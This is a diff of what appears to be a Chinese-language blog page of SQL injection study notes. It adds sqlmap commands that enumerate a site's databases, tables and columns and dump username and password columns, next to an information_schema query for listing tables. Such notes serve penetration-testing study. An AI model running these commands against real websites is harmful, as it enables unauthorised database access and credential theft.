@@ -380,7 +380,20 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <h1 id="常见注入手段"><a href="#常见注入手段" class="headerlink" title="常见注入手段"></a>常见注入手段</h1><p><img src="https://article.biliimg.com/bfs/article/afc254a3a46a185f41dd26e65aa2a6e7290349942.png"></p>
+          <p><a href="https://www.freebuf.com/sectool/164608.html">sqlmap</a></p>
+<pre><code class="shell">sqlmap.py -u URL --forms
+
+sqlmap.py -u URL --forms --dbs
+
+sqlmap.py -u URL --forms --current-db
+
+sqlmap.py -u URL --forms -D 数据库名称--tables
+
+sqlmap.py -u URL --forms -D 数据库名称 -T 表名 --columns
+
+sqlmap.py -u URL --forms -D 数据库名称 -T 表名 -Cusername，password --dump
+</code></pre>
+<h1 id="常见注入手段"><a href="#常见注入手段" class="headerlink" title="常见注入手段"></a>常见注入手段</h1><p><img src="https://article.biliimg.com/bfs/article/afc254a3a46a185f41dd26e65aa2a6e7290349942.png"></p>
 <h1 id="获取tables-databases-version"><a href="#获取tables-databases-version" class="headerlink" title="获取tables+databases+version"></a>获取tables+databases+version</h1><h2 id="获取databases-version"><a href="#获取databases-version" class="headerlink" title="获取databases+version"></a>获取databases+version</h2><p>使用<code>database()</code>函数和<code>version()</code> 函数</p>
 <h2 id="获取-tables"><a href="#获取-tables" class="headerlink" title="获取 tables"></a>获取 tables</h2><pre><code class="sql">select table_name from information_schema.tables where table_schema=database();     
 </code></pre>
